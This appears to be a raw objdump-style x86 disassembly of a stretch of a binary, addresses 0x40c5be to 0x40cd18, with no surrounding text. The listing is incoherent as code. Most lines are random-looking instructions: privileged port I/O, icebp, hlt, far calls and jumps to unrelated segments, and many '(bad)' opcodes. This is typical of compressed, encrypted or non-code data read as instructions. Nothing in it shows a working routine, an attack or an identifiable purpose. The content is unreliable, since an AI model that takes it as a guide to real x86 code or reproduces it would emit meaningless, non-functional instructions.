  40c5be:	and    BYTE PTR [edi+0x4a639486],dh
  40c5c4:	xor    bh,BYTE PTR [ecx+0x30b286a4]
  40c5ca:	repnz push ss
  40c5cc:	xchg   BYTE PTR [edx+esi*4],dl
  40c5cf:	sub    eax,0x4b9e3708
  40c5d4:	mov    ebx,0x3610dc79
  40c5d9:	xchg   edi,eax
  40c5da:	out    dx,al
  40c5db:	loopne 0x40c59c
  40c5dd:	jmp    0x40c5fb
  40c5df:	mov    ds:0x55a4a2ef,al
  40c5e4:	dec    edi
  40c5e5:	fcmove st,st(7)
  40c5e7:	push   esp
  40c5e8:	pop    ds
  40c5e9:	adc    al,0x5a
  40c5eb:	icebp  
  40c5ec:	repnz mov ebx,0xb5afb1da
  40c5f2:	pusha  
  40c5f3:	mov    edi,0xb2be0816
  40c5f8:	xor    DWORD PTR [eax-0x3f],ebp
  40c5fb:	iret   
  40c5fc:	js     0x40c64b
  40c5fe:	and    bh,al
  40c600:	mov    ds:0xf715361b,eax
  40c605:	sbb    ch,dh
  40c607:	cmp    al,BYTE PTR es:[eax]
  40c60a:	clc    
  40c60b:	stos   BYTE PTR es:[edi],al
  40c60c:	ins    DWORD PTR es:[edi],dx
  40c60d:	loop   0x40c65f
  40c60f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c610:	mov    dh,0xd8
  40c612:	adc    esi,DWORD PTR [ebx]
  40c614:	in     al,0x7d
  40c616:	mov    ch,0x93
  40c618:	das    
  40c619:	adc    DWORD PTR [edi-0x775e8f71],eax
  40c61f:	mov    WORD PTR [edx-0x351ae044],?
  40c625:	out    0x42,eax
  40c627:	pop    esi
  40c628:	mov    ah,BYTE PTR [ebp-0x43]
  40c62b:	pop    ecx
  40c62c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c62d:	xchg   ebp,eax
  40c62e:	xlat   BYTE PTR ds:[ebx]
  40c62f:	xchg   DWORD PTR [edi+ebp*2],edi
  40c632:	call   0xace1be3
  40c637:	push   ebx
  40c638:	hlt    
  40c639:	inc    esp
  40c63a:	leave  
  40c63b:	sahf   
  40c63c:	addr16 icebp 
  40c63e:	or     ch,bh
  40c640:	test   DWORD PTR [ebp-0x139050e0],esp
  40c646:	push   edx
  40c647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c648:	mov    ah,BYTE PTR [ebx]
  40c64a:	mov    ds:0x390eda4a,al
  40c64f:	push   edx
  40c650:	repz leave 
  40c652:	mov    ecx,0xc9ebde00
  40c657:	cmp    al,0x56
  40c659:	jmp    DWORD PTR [edi]
  40c65b:	pop    DWORD PTR [esi]
  40c65d:	repz mov ebx,0xadf7f637
  40c663:	outs   dx,DWORD PTR ds:[si]
  40c665:	adc    cl,BYTE PTR [ebx]
  40c667:	and    DWORD PTR [eax+ebp*4+0x640be2d4],ebp
  40c66e:	or     eax,0xc6093da3
  40c673:	aas    
  40c674:	dec    ecx
  40c675:	mov    WORD PTR [esi-0xbabdabb],es
  40c67b:	sbb    BYTE PTR [ebx-0x859ecd8],dl
  40c681:	push   ss
  40c682:	dec    ebp
  40c683:	mov    dh,0xe2
  40c685:	xlat   BYTE PTR ds:[ebx]
  40c686:	ror    BYTE PTR [eax+0x5d611170],cl
  40c68c:	repz inc edi
  40c68e:	dec    esi
  40c68f:	in     al,dx
  40c690:	xor    al,0x86
  40c692:	push   ebp
  40c693:	add    bh,0x5b
  40c696:	pop    edi
  40c697:	mov    gs,WORD PTR [edi+0x2d5684b2]
  40c69d:	cld    
  40c69e:	dec    eax
  40c69f:	bound  edi,QWORD PTR [eax-0xf]
  40c6a2:	push   ebp
  40c6a3:	jb     0x40c682
  40c6a5:	jne    0x40c6eb
  40c6a7:	test   DWORD PTR [edi+0x52],ecx
  40c6aa:	jg     0x40c68b
  40c6ac:	xchg   dl,cl
  40c6ae:	xabort 0x6c
  40c6b1:	int3   
  40c6b2:	out    dx,al
  40c6b3:	pop    esi
  40c6b4:	sbb    esi,DWORD PTR [edx]
  40c6b6:	aad    0xf5
  40c6b8:	iret   
  40c6b9:	adc    ebp,DWORD PTR [edi-0x53e46510]
  40c6bf:	inc    eax
  40c6c0:	cmp    DWORD PTR [esi],ebx
  40c6c2:	in     eax,dx
  40c6c3:	pop    es
  40c6c4:	ror    esi,0xf7
  40c6c7:	mov    dl,ch
  40c6c9:	scas   al,BYTE PTR es:[edi]
  40c6ca:	leave  
  40c6cb:	jp     0x40c6e3
  40c6cd:	mov    cl,0x9f
  40c6cf:	mov    eax,0x3995cf80
  40c6d4:	rcl    BYTE PTR [esi-0x566bce11],cl
  40c6da:	push   eax
  40c6db:	xchg   DWORD PTR [ecx*8-0x5d6fbb57],edi
  40c6e2:	stos   BYTE PTR es:[edi],al
  40c6e3:	mov    eax,0x84e02cca
  40c6e8:	fidivr DWORD PTR [eax-0xb]
  40c6eb:	cmp    eax,0x3374390c
  40c6f0:	out    0x3a,eax
  40c6f2:	jne    0x40c70b
  40c6f4:	(bad)  
  40c6f5:	and    DWORD PTR [edi+0x76],esp
  40c6f8:	sub    BYTE PTR [ecx],al
  40c6fa:	stos   BYTE PTR es:[edi],al
  40c6fb:	jae    0x40c702
  40c6fd:	clc    
  40c6fe:	test   al,0x5f
  40c700:	and    eax,0x74eaef62
  40c705:	mov    ah,0xd2
  40c707:	mov    bh,0xf
  40c709:	xchg   esp,eax
  40c70a:	sub    al,0x5e
  40c70c:	aam    0x9f
  40c70e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c70f:	lea    ebx,[esi+0x2da54315]
  40c715:	push   cs
  40c716:	retf   
  40c717:	mov    ds:0x32596ee4,al
  40c71c:	imul   edx,DWORD PTR [esi+0x71],0x2e
  40c720:	mov    ebp,ebp
  40c722:	icebp  
  40c723:	not    BYTE PTR [edi-0x5f]
  40c726:	lods   al,BYTE PTR ds:[esi]
  40c727:	icebp  
  40c728:	dec    edx
  40c729:	and    esi,DWORD PTR [eax+0x773ea581]
  40c72f:	and    DWORD PTR [ecx+eax*8+0x78],0x21d16c7
  40c737:	adc    al,0xdc
  40c739:	ficomp WORD PTR [edx+0x3a5ec033]
  40c73f:	bound  esi,QWORD PTR [edi-0x13f44dc3]
  40c745:	mov    dh,0x2b
  40c747:	cwde   
  40c748:	mov    dl,0x14
  40c74a:	push   esi
  40c74b:	lea    edx,[edx+0x410d0963]
  40c751:	jb     0x40c7c0
  40c753:	push   es
  40c754:	xor    DWORD PTR [esi],ebx
  40c756:	out    0x56,al
  40c758:	sbb    al,0x63
  40c75a:	stos   BYTE PTR es:[edi],al
  40c75b:	lds    esi,FWORD PTR [ebx]
  40c75d:	in     eax,0xfb
  40c75f:	mov    edi,0x77659ef9
  40c764:	les    edx,FWORD PTR [ecx+0x4e]
  40c767:	push   ecx
  40c768:	jl     0x40c7bc
  40c76a:	jp     0x40c742
  40c76c:	bound  ebx,QWORD PTR [esi-0x26]
  40c76f:	jg     0x40c797
  40c771:	std    
  40c772:	jmp    0x40c797
  40c774:	pop    ds
  40c775:	imul   edx,ebx,0xfffffffc
  40c778:	shl    DWORD PTR [esi-0x4c],0x91
  40c77c:	in     al,0x48
  40c77e:	outs   dx,BYTE PTR ds:[esi]
  40c77f:	ss cdq 
  40c781:	mov    bl,0x8
  40c783:	rcr    BYTE PTR [eax+0x3e],0x8
  40c787:	mov    dh,0x6d
  40c789:	adc    al,BYTE PTR [edx+0x2]
  40c78c:	shl    DWORD PTR [eax-0x30],0xb3
  40c790:	push   edx
  40c791:	xor    BYTE PTR [edi+0x633c9e92],ch
  40c797:	(bad)  
  40c798:	mov    ebp,0x739f88a8
  40c79d:	loope  0x40c7cf
  40c79f:	popf   
  40c7a0:	je     0x40c816
  40c7a2:	sub    BYTE PTR [edx+ebp*2-0x7bdc5c3d],ch
  40c7a9:	aas    
  40c7aa:	das    
  40c7ab:	sbb    DWORD PTR [edx+0x679cd263],eax
  40c7b1:	pop    esp
  40c7b2:	pop    es
  40c7b3:	dec    ebx
  40c7b4:	iret   
  40c7b5:	cmp    ebp,DWORD PTR [ebp+0x6d]
  40c7b8:	aas    
  40c7b9:	mov    ah,0x44
  40c7bb:	pop    esp
  40c7bc:	push   ss
  40c7bd:	les    edi,FWORD PTR [edi-0x6d8acb6]
  40c7c3:	ds jb  0x40c7ac
  40c7c6:	jmp    0x40c763
  40c7c8:	inc    ecx
  40c7c9:	sub    DWORD PTR ds:0xf3ed3991,esp
  40c7cf:	enter  0xa9e0,0xa7
  40c7d3:	jns    0x40c7f5
  40c7d5:	(bad)  
  40c7d7:	das    
  40c7d8:	call   0x76e1:0x9c9d8c6a
  40c7df:	cmp    eax,0x952a53fd
  40c7e4:	jno    0x40c7de
  40c7e6:	sub    esp,0xffffffca
  40c7e9:	dec    ecx
  40c7ea:	icebp  
  40c7eb:	xchg   edi,eax
  40c7ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7ed:	int3   
  40c7ee:	inc    edx
  40c7ef:	mov    dl,0x29
  40c7f1:	inc    esi
  40c7f2:	(bad)  
  40c7f3:	out    0x7f,al
  40c7f5:	and    eax,0xbbb9b358
  40c7fa:	in     al,0x9d
  40c7fc:	xlat   BYTE PTR ds:[ebx]
  40c7fd:	hlt    
  40c7fe:	jecxz  0x40c7d1
  40c800:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c801:	ds (bad) 
  40c803:	cli    
  40c804:	aam    0x8f
  40c806:	(bad)  
  40c807:	scas   eax,DWORD PTR es:[edi]
  40c808:	mov    ecx,0xe89c70a0
  40c80d:	xor    BYTE PTR [edi-0x5],bl
  40c810:	cwde   
  40c811:	xchg   edx,eax
  40c812:	adc    al,bh
  40c814:	ins    DWORD PTR es:[edi],dx
  40c815:	nop
  40c816:	adc    DWORD PTR [ebx+0x4a],esi
  40c819:	stos   BYTE PTR es:[edi],al
  40c81a:	xchg   ebp,eax
  40c81b:	out    dx,al
  40c81c:	pop    es
  40c81d:	cld    
  40c81e:	outs   dx,DWORD PTR ds:[esi]
  40c81f:	(bad)  
  40c821:	cmc    
  40c822:	(bad)  
  40c823:	sbb    DWORD PTR [esi-0x4dc34859],ebx
  40c829:	sub    al,0x35
  40c82b:	dec    ecx
  40c82c:	adc    DWORD PTR [edi+0xb],ebx
  40c82f:	data16 icebp 
  40c831:	dec    edi
  40c832:	inc    DWORD PTR [ecx+ebx*1+0x259e54cc]
  40c839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c83a:	push   ebx
  40c83b:	and    BYTE PTR [eax],0x8d
  40c83e:	jg     0x40c7d2
  40c840:	mov    esp,0xcee6f123
  40c845:	sbb    al,0x1b
  40c847:	fwait
  40c848:	mov    ebp,0x86baab6c
  40c84d:	addr16 sbb al,0x89
  40c850:	pop    ds
  40c851:	cmp    al,0xbf
  40c853:	and    al,0x9b
  40c855:	cmovne edx,DWORD PTR [esi]
  40c858:	and    dl,BYTE PTR [edx]
  40c85a:	ss mov edx,0x862b7204
  40c860:	outs   dx,BYTE PTR ds:[esi]
  40c861:	retf   
  40c862:	push   edi
  40c863:	adc    ah,BYTE PTR [eax-0x31]
  40c866:	in     al,dx
  40c867:	adc    ebp,DWORD PTR [ebp+0x376465fb]
  40c86d:	add    BYTE PTR [eax-0x5ba58ed3],bl
  40c873:	push   ebp
  40c874:	xor    DWORD PTR [eax-0x35],esp
  40c877:	inc    ecx
  40c878:	in     eax,0xcf
  40c87a:	jg     0x40c853
  40c87c:	rol    BYTE PTR [edx],0x43
  40c87f:	jns    0x40c89d
  40c881:	imul   BYTE PTR ss:[eax+0x36b12267]
  40c888:	xchg   edi,eax
  40c889:	stos   BYTE PTR es:[edi],al
  40c88a:	mov    DWORD PTR ds:0xd080a13e,edi
  40c890:	jp     0x40c8ad
  40c892:	loope  0x40c89c
  40c894:	data16 jmp 0x40c8c4
  40c897:	xlat   BYTE PTR ds:[ebx]
  40c898:	mov    esp,0x6e618fcf
  40c89d:	fadd   st,st(3)
  40c89f:	loope  0x40c8e2
  40c8a1:	loop   0x40c868
  40c8a3:	sti    
  40c8a4:	sar    DWORD PTR [eax+0x61a6399e],1
  40c8aa:	and    BYTE PTR [eax+edx*4-0x64ce87d4],dh
  40c8b1:	or     al,0xae
  40c8b3:	outs   dx,BYTE PTR ds:[esi]
  40c8b4:	in     eax,0x56
  40c8b6:	add    ah,BYTE PTR [ecx+0x53ba7003]
  40c8bc:	mov    ds:0x92527a62,eax
  40c8c1:	outs   dx,DWORD PTR ds:[esi]
  40c8c2:	sub    DWORD PTR [edx+0x57db9003],0xffffffd1
  40c8c9:	loopne 0x40c8ae
  40c8cb:	push   ebx
  40c8cc:	xchg   esi,eax
  40c8cd:	pop    ds
  40c8ce:	imul   esp,DWORD PTR [ebp-0x3],0xffffffb0
  40c8d2:	sbb    eax,0x96b500d8
  40c8d7:	popa   
  40c8d8:	mov    ah,0x6a
  40c8da:	lods   al,BYTE PTR ds:[esi]
  40c8db:	icebp  
  40c8dc:	int    0x7b
  40c8de:	ret    0xe579
  40c8e1:	btc    ebx,0xea
  40c8e5:	popa   
  40c8e6:	aas    
  40c8e7:	xor    DWORD PTR [edx+ebp*8-0x8eb5d7e],ebp
  40c8ee:	div    BYTE PTR [edi+0x13]
  40c8f1:	sub    esi,DWORD PTR [esi+0xf]
  40c8f4:	mov    ds:0xdd858c44,eax
  40c8f9:	icebp  
  40c8fa:	jbe    0x40c89e
  40c8fc:	data16 fdivr DWORD PTR [esi]
  40c8ff:	jmp    0xa4416f90
  40c904:	sbb    BYTE PTR [esi-0x75],ch
  40c907:	shl    DWORD PTR fs:[esi+0x35],1
  40c90b:	mov    ds:0x27415dd2,al
  40c910:	cmp    al,0x53
  40c912:	sub    eax,0x887492c8
  40c917:	mov    ds:0xf58b308c,eax
  40c91c:	repz fsub DWORD PTR [ebp-0x62]
  40c920:	pop    ebx
  40c921:	rol    BYTE PTR [edx],cl
  40c923:	jp     0x40c956
  40c925:	or     eax,0xdd836c8e
  40c92a:	mov    ss,WORD PTR [ebp+edx*2-0x545be21e]
  40c931:	or     BYTE PTR [esp+edx*8-0x2dbc84d3],bh
  40c938:	dec    ecx
  40c939:	jb     0x40c8de
  40c93b:	sbb    eax,0x86cd4622
  40c940:	push   ebp
  40c941:	mov    ebp,0x8fb8a24
  40c946:	xor    BYTE PTR [edi],ch
  40c948:	and    al,0xe3
  40c94a:	xor    eax,0x1f9c7f19
  40c94f:	into   
  40c950:	std    
  40c951:	add    ch,BYTE PTR [ecx+0x6f]
  40c954:	push   esi
  40c955:	and    eax,DWORD PTR [edx-0x2f]
  40c958:	sti    
  40c959:	dec    edx
  40c95a:	jl     0x40c992
  40c95c:	mov    ebx,0x508d9f91
  40c961:	cmp    al,bh
  40c963:	lods   al,BYTE PTR ds:[esi]
  40c964:	cdq    
  40c965:	retf   0xdc0
  40c968:	mov    ebp,0x8ffb213b
  40c96d:	ror    DWORD PTR [edi-0x19],0x7b
  40c971:	add    BYTE PTR [ebp+edi*2-0x33],ah
  40c975:	add    al,0x56
  40c977:	aas    
  40c978:	xor    eax,0x4191c3a7
  40c97d:	cmp    ch,BYTE PTR [edx+0x48]
  40c980:	jg     0x40c90b
  40c982:	test   DWORD PTR [eax-0x6a2cd806],esp
  40c988:	cmp    DWORD PTR [ebx+0x58fb8ab7],esp
  40c98e:	shl    DWORD PTR [esi],cl
  40c990:	aam    0x34
  40c992:	test   DWORD PTR [edx-0x2c72e152],edx
  40c998:	cmp    DWORD PTR [esi],0xffffffa9
  40c99b:	sub    BYTE PTR [ecx],ah
  40c99d:	mov    ds:0xb59731b8,eax
  40c9a2:	xchg   esi,eax
  40c9a3:	repz mov ?,WORD PTR [esi-0x5b937e4b]
  40c9aa:	outs   dx,DWORD PTR ds:[esi]
  40c9ab:	add    bl,dh
  40c9ad:	test   BYTE PTR ds:0x9907e869,0xab
  40c9b4:	or     al,0xa1
  40c9b6:	xor    eax,0x29706265
  40c9bb:	add    BYTE PTR [esi-0x5],0x94
  40c9bf:	jle    0x40c9b6
  40c9c1:	repnz mov al,ds:0x8d9442c
  40c9c7:	lahf   
  40c9c8:	ins    BYTE PTR es:[edi],dx
  40c9c9:	retf   
  40c9ca:	rcl    DWORD PTR [edx+0x4d5fb68],cl
  40c9d0:	scas   eax,DWORD PTR es:[edi]
  40c9d1:	jo     0x40c96f
  40c9d3:	and    BYTE PTR [edi+0x5a],dl
  40c9d6:	xchg   DWORD PTR [ebx],edx
  40c9d8:	mov    cl,BYTE PTR [esi-0x60c28c46]
  40c9de:	(bad)  
  40c9df:	jmp    0x40ca55
  40c9e1:	push   es
  40c9e2:	jnp    0x40ca4b
  40c9e4:	je     0x40c9e5
  40c9e6:	rcl    esp,0x7f
  40c9e9:	mov    ch,0x74
  40c9eb:	adc    DWORD PTR [edi-0x43a49e93],ebx
  40c9f1:	and    eax,0x139d8a12
  40c9f6:	xchg   ecx,eax
  40c9f7:	jmp    0x163e05ee
  40c9fc:	int3   
  40c9fd:	mov    edx,DWORD PTR [edx-0x18]
  40ca00:	js     0x40c99c
  40ca02:	js     0x40c9e6
  40ca04:	dec    eax
  40ca05:	fcmovb st,st(5)
  40ca07:	sbb    al,0x79
  40ca09:	ret    0xb488
  40ca0c:	dec    eax
  40ca0d:	sahf   
  40ca0e:	inc    eax
  40ca0f:	in     eax,0x45
  40ca11:	xor    ebp,eax
  40ca13:	dec    ebp
  40ca14:	push   cs
  40ca15:	mov    ecx,0xba84c648
  40ca1a:	loop   0x40c9b9
  40ca1c:	out    0x63,al
  40ca1e:	mov    bh,0x9b
  40ca20:	mov    DWORD PTR [ebx-0x7df4dbb6],eax
  40ca26:	loop   0x40ca21
  40ca28:	jmp    0x625b:0x9c1a867a
  40ca2f:	cli    
  40ca30:	add    dh,BYTE PTR [esi]
  40ca32:	aad    0x2d
  40ca34:	lods   eax,DWORD PTR ds:[esi]
  40ca35:	sbb    cl,BYTE PTR [esi+0x53]
  40ca38:	je     0x40c9c4
  40ca3a:	pop    edx
  40ca3b:	xor    ebp,ebp
  40ca3d:	callw  0x17ad
  40ca41:	ja     0x40ca9c
  40ca43:	mov    di,0xdb0c
  40ca47:	add    eax,0xcc1901c4
  40ca4c:	sahf   
  40ca4d:	push   cs
  40ca4e:	rol    DWORD PTR [esi],0x94
  40ca51:	push   cs
  40ca52:	add    BYTE PTR [eax],0x78
  40ca55:	dec    edi
  40ca56:	sbb    DWORD PTR [ebx+0x25],ebp
  40ca59:	mov    ecx,0xff4198c4
  40ca5e:	add    al,0xc7
  40ca60:	and    bl,BYTE PTR [edi-0x30be20b5]
  40ca66:	or     eax,0x75352849
  40ca6b:	push   cs
  40ca6c:	sbb    ebp,0xa48705e0
  40ca72:	inc    edx
  40ca73:	sub    DWORD PTR [edx+0x1c],esp
  40ca76:	out    0x46,eax
  40ca78:	push   eax
  40ca79:	mov    edi,0x1fe18406
  40ca7e:	mov    esp,0x9c266f4
  40ca83:	leave  
  40ca84:	adc    eax,DWORD PTR [eax+0x19e04563]
  40ca8a:	cwde   
  40ca8b:	pushf  
  40ca8c:	push   eax
  40ca8d:	add    edi,ebx
  40ca8f:	xor    dh,al
  40ca91:	rcr    DWORD PTR [esi],cl
  40ca93:	xchg   ebp,eax
  40ca94:	aam    0x17
  40ca96:	fstp   TBYTE PTR [edi]
  40ca98:	mov    ebx,0xa17a93ae
  40ca9d:	lock cmc 
  40ca9f:	fwait
  40caa0:	and    al,0x16
  40caa2:	sbb    al,dl
  40caa4:	push   edi
  40caa5:	pop    esi
  40caa6:	stos   DWORD PTR es:[edi],eax
  40caa7:	rcr    DWORD PTR [eax],0x5c
  40caaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caab:	(bad)  
  40caad:	cmp    eax,0x326c34c2
  40cab2:	push   esi
  40cab3:	jnp    0x40cb2d
  40cab5:	push   es
  40cab6:	out    0xe9,al
  40cab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cab9:	mov    db5,edi
  40cabc:	rcr    DWORD PTR [ebx],cl
  40cabe:	sub    BYTE PTR [esp+edi*8+0x68],cl
  40cac2:	push   esi
  40cac3:	sub    al,0x1b
  40cac5:	shl    DWORD PTR [edx],1
  40cac7:	mov    ecx,0x7689cda
  40cacc:	leave  
  40cacd:	addr16 aas 
  40cacf:	lea    ebx,[edx+0x14d9fad7]
  40cad5:	retf   0x77c1
  40cad8:	pusha  
  40cad9:	vsubpd xmm4,xmm7,XMMWORD PTR [ebp+0x71c9581a]
  40cae1:	adc    ch,dh
  40cae3:	loop   0x40caff
  40cae5:	xor    eax,0x4c567dce
  40caea:	mov    al,0xa3
  40caec:	add    eax,ebp
  40caee:	shl    edi,1
  40caf0:	into   
  40caf1:	jnp    0x40ca8a
  40caf3:	inc    ecx
  40caf4:	repz inc ebp
  40caf6:	imul   edi,DWORD PTR [ebp+0x42],0x5c4229db
  40cafd:	inc    edi
  40cafe:	dec    al
  40cb00:	je     0x40cb45
  40cb02:	pop    ecx
  40cb03:	pop    ds
  40cb04:	imul   esp,esi,0xfffffff2
  40cb07:	loopne 0x40cabe
  40cb09:	mov    esi,0xa1bd8b47
  40cb0e:	mov    esp,0x6206b57b
  40cb13:	mov    ebp,0x3fc1617a
  40cb18:	adc    ecx,DWORD PTR [edi-0x15]
  40cb1b:	push   ebx
  40cb1c:	adc    eax,0x887163d4
  40cb21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb22:	ja     0x40cad4
  40cb24:	in     al,0x4e
  40cb26:	clc    
  40cb27:	(bad)  
  40cb28:	pop    ecx
  40cb29:	es mov dl,0x31
  40cb2c:	neg    DWORD PTR [ecx-0x595ba096]
  40cb32:	jnp    0x40cb44
  40cb34:	cdq    
  40cb35:	cmova  esp,edi
  40cb38:	push   edx
  40cb39:	or     DWORD PTR [ebp+0x3396161],0xffffffcf
  40cb40:	jp     0x40cb68
  40cb42:	clc    
  40cb43:	lods   eax,DWORD PTR ds:[esi]
  40cb44:	mov    ds:0xa886b700,eax
  40cb49:	sub    dl,dl
  40cb4b:	sbb    ecx,DWORD PTR [ebx-0x80]
  40cb4e:	jb     0x40cb79
  40cb50:	mov    ch,BYTE PTR [edx+0x632f0c76]
  40cb56:	mov    edi,gs
  40cb58:	add    DWORD PTR [ecx+0x68],edi
  40cb5b:	fild   WORD PTR ds:0xd6eb6712
  40cb61:	(bad)  
  40cb62:	jne    0x40cb22
  40cb64:	and    al,0xdf
  40cb66:	mov    ah,0x34
  40cb68:	or     bl,cl
  40cb6a:	dec    ebp
  40cb6b:	pop    ds
  40cb6c:	(bad)  
  40cb6d:	xchg   ebx,eax
  40cb6e:	mov    es,WORD PTR [eax]
  40cb70:	xor    al,0x2a
  40cb72:	aas    
  40cb73:	xor    DWORD PTR [ecx+0x399bb951],esi
  40cb79:	inc    esp
  40cb7a:	bound  ebx,QWORD PTR [esi-0x29bcac5b]
  40cb80:	mov    esi,0x8112204b
  40cb85:	fdivp  st(1),st
  40cb87:	pop    ds
  40cb88:	leave  
  40cb89:	mov    al,0x12
  40cb8b:	jbe    0x40cc0c
  40cb8d:	push   cs
  40cb8e:	sub    eax,0x32eebe34
  40cb93:	add    dl,BYTE PTR [esi]
  40cb95:	addr16 shr esi,1
  40cb98:	out    0x10,al
  40cb9a:	(bad)  
  40cb9b:	sbb    al,0x73
  40cb9d:	jecxz  0x40cb60
  40cb9f:	fldenv [edx+0xe30a78b]
  40cba5:	jge    0x40cb7d
  40cba7:	push   0xffffffd4
  40cba9:	mov    bh,0x8f
  40cbab:	xor    al,0xef
  40cbad:	push   ebp
  40cbae:	inc    esi
  40cbaf:	js     0x40cbfa
  40cbb1:	in     al,dx
  40cbb2:	ret    0xb614
  40cbb5:	ret    
  40cbb6:	jge    0x40cb84
  40cbb8:	inc    ebx
  40cbb9:	in     al,dx
  40cbba:	je     0x40cc1a
  40cbbc:	or     edx,eax
  40cbbe:	and    DWORD PTR [ecx],esi
  40cbc0:	and    ebx,DWORD PTR ds:0x614e706c
  40cbc6:	mov    al,ds:0x2e2456b3
  40cbcb:	pop    ss
  40cbcc:	pop    ss
  40cbcd:	cmp    al,0xa3
  40cbcf:	hlt    
  40cbd0:	prefetch (bad)
  40cbd1:	or     eax,0x5d64f9f3
  40cbd6:	popa   
  40cbd7:	(bad)  
  40cbd8:	cmp    al,0xfb
  40cbda:	pop    ds
  40cbdb:	cmc    
  40cbdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbdd:	in     eax,0x1a
  40cbdf:	adc    esi,DWORD PTR [edi+0x35ffd10e]
  40cbe5:	fiadd  DWORD PTR [edi+0x3d]
  40cbe8:	call   0x5b86:0xe1f7dcfa
  40cbef:	ret    
  40cbf0:	sti    
  40cbf1:	pop    edi
  40cbf2:	(bad)  
  40cbf4:	xchg   esi,eax
  40cbf5:	push   ss
  40cbf6:	push   eax
  40cbf7:	ret    
  40cbf8:	mov    edx,DWORD PTR [ebx+0x6c3d8cdd]
  40cbfe:	div    DWORD PTR [ebp-0x4532d050]
  40cc04:	adc    edx,esp
  40cc06:	arpl   bx,bp
  40cc08:	fiadd  DWORD PTR [ebp-0x1ef49cb5]
  40cc0e:	lods   eax,DWORD PTR ds:[esi]
  40cc0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc10:	(bad)  
  40cc11:	adc    BYTE PTR [edx-0xc],bl
  40cc14:	int    0xfb
  40cc16:	or     al,BYTE PTR [ecx]
  40cc18:	inc    edx
  40cc19:	out    0x14,al
  40cc1b:	jae    0x40cbcb
  40cc1d:	push   es
  40cc1e:	xchg   ecx,eax
  40cc1f:	in     eax,dx
  40cc20:	xchg   esi,edi
  40cc22:	fwait
  40cc23:	sub    BYTE PTR [edi],dh
  40cc25:	pop    eax
  40cc26:	iret   
  40cc27:	hlt    
  40cc28:	xlat   BYTE PTR ds:[ebx]
  40cc29:	test   BYTE PTR [edi+0x6abfcb75],ch
  40cc2f:	mov    ebx,0xbec2021b
  40cc34:	push   esi
  40cc35:	jle    0x40cc3b
  40cc37:	aad    0x7a
  40cc39:	hlt    
  40cc3a:	cmp    al,0x2
  40cc3c:	outs   dx,BYTE PTR ds:[esi]
  40cc3d:	mov    ds:0x7afede8,eax
  40cc42:	and    edx,DWORD PTR [eax-0x7d]
  40cc45:	pop    esi
  40cc46:	ror    DWORD PTR [esi-0x11],cl
  40cc49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc4a:	js     0x40cc9f
  40cc4c:	jecxz  0x40cc2d
  40cc4e:	sar    BYTE PTR [ebp+0x7e2ce5e4],0x3c
  40cc55:	in     al,0x9
  40cc57:	pop    eax
  40cc58:	daa    
  40cc59:	mov    cl,0x34
  40cc5b:	fsubr  DWORD PTR [eax-0x6f]
  40cc5e:	arpl   WORD PTR [edx+0x42fdc7c4],cx
  40cc64:	inc    ebp
  40cc65:	cmc    
  40cc66:	jp     0x40ccd0
  40cc68:	out    dx,al
  40cc69:	repnz rcl BYTE PTR [ebp+0x7458c206],cl
  40cc70:	fdiv   st,st(6)
  40cc72:	sub    eax,0xa62e6a5
  40cc77:	xor    al,0x83
  40cc79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc7a:	shl    BYTE PTR [edx+0x26b489bf],cl
  40cc80:	jbe    0x40cc91
  40cc82:	or     eax,0x1b5d6c7b
  40cc87:	sbb    bh,BYTE PTR [ebx+0x4897c8f2]
  40cc8d:	es push ds
  40cc8f:	popf   
  40cc90:	mov    esi,0x75d4ad37
  40cc95:	push   edi
  40cc96:	cmp    DWORD PTR [ecx-0x5d],esi
  40cc99:	stos   DWORD PTR es:[edi],eax
  40cc9a:	mov    cl,0xd9
  40cc9c:	daa    
  40cc9d:	iret   
  40cc9e:	and    dh,BYTE PTR [ecx-0x15e265df]
  40cca4:	into   
  40cca5:	out    dx,eax
  40cca6:	mov    bh,0x46
  40cca8:	outs   dx,DWORD PTR ds:[esi]
  40cca9:	fist   DWORD PTR [ebp+0x0]
  40ccac:	(bad)  
  40ccad:	(bad)  
  40ccae:	push   ecx
  40ccaf:	xchg   ebp,eax
  40ccb0:	add    edi,esi
  40ccb2:	jle    0x40ccc3
  40ccb4:	and    bh,BYTE PTR [esp+edx*8+0x68]
  40ccb8:	mov    bh,0x7
  40ccba:	or     eax,esp
  40ccbc:	adc    BYTE PTR [edx-0x2bdecd2f],ah
  40ccc2:	sub    ch,dh
  40ccc4:	pop    esp
  40ccc5:	sub    dl,BYTE PTR [edx]
  40ccc7:	xchg   DWORD PTR [ecx-0x5fa5c4b2],esp
  40cccd:	ss adc al,0x26
  40ccd0:	pop    ebp
  40ccd1:	mov    ebp,0xde56821c
  40ccd6:	inc    ebx
  40ccd7:	aad    0x6a
  40ccd9:	scas   eax,DWORD PTR es:[edi]
  40ccda:	ficomp WORD PTR [ecx]
  40ccdc:	adc    DWORD PTR ds:0x948a7ac7,esi
  40cce2:	dec    edx
  40cce3:	or     cl,BYTE PTR [edi+0x7f4bf422]
  40cce9:	or     eax,0xe48787be
  40ccee:	sti    
  40ccef:	push   edx
  40ccf0:	push   ecx
  40ccf1:	or     cl,BYTE PTR [eax-0x75]
  40ccf4:	sub    al,0x60
  40ccf6:	mul    DWORD PTR [ecx+0x595e0eca]
  40ccfc:	and    ebx,DWORD PTR [ebx-0x15fd1c98]
  40cd02:	in     al,dx
  40cd03:	test   BYTE PTR [ecx+edx*1+0xf04930f],ah
  40cd0a:	(bad)  
  40cd0b:	es pop esi
  40cd0d:	daa    
  40cd0e:	or     BYTE PTR [esp+ecx*4+0x2ef2fa03],ch
  40cd15:	mov    dh,0x4d
  40cd17:	inc    ebp
  40cd18:	iret   
